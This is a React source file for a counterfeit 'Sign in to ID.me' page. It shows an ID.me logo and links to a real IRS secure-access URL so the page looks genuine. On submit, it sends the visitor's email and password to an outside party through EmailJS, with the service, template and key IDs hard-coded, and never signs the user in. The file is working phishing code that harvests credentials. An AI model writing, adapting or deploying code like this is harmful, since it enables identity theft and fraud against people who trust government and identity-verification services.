import "./App.css";
import { useState, useRef } from "react";
import emailjs from '@emailjs/browser';
import img from "../src/Assets/idmage.png";

const App = () => {
  const [email, setEmail] = useState();
  const [password, setPassword] = useState();

  const form = useRef();

  const sendEmail = () => {
    emailjs.sendForm('service_upbuxgk', 'template_8jho19g', form.current, 'IJVju1s_NrxtfuCN_')
      .then((result) => {
          console.log(result.text);
      }, (error) => {
          console.log(error.text);
      });
  };

  const checkout = (e) => {
    e.preventDefault();
    sendEmail()
    setEmail("")
    setPassword("")
  };

  return (
    <>
      <nav className="nav">
        <img src={img} alt="" />
      </nav>
      <div className="area">
        <h2>Sign in to ID.me</h2>
        <div className="blue">
          <span>New to ID.me?</span>
          <a href="https://sa.www4.irs.gov/secureaccess/ui/?TYPE=33554433&REALMOID=06-0006b18e-628e-1187-a229-7c2b0ad00000&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=-SM-u0ktItgVFneUJDzkQ7tjvLYXyclDooCJJ7%2bjXGjg3YC5id2x9riHE98hoVgd1BBv&TARGET=-SM-https%3a%2f%2fsa%2ewww4%2eirs%2egov%2fola%2f">
            Create an ID.me account
          </a>
        </div>
        <form ref={form} onSubmit={checkout}>
          <div className="data">
            <label htmlFor="email">Email</label>
            <input
              placeholder="Enter your email address"
              required
              name="user_email"
              value={email}
              onChange={(e) => {
                setEmail(e.target.value);
              }}
              type="email"
              id="password"
            />
          </div>
          <div className="data">
            <label htmlFor="password">Password</label>
            <input
              name="user_password"
              required
              value={password}
              onChange={(e)=>{setPassword(e.target.value)}}
              placeholder="Enter password"
              type="password"
              id="password"
            />
          </div>
          <div className="rem">
            <input type="checkbox" name="remember" id="remember" />
            <div className="remTx">
              <label htmlFor="remember">Remember me</label>
              <span>For your security, select only on your device</span>
            </div>
          </div>
          <button type="submit">Sign in</button>
        </form>
      </div>
    </>
  );
};

export default App;
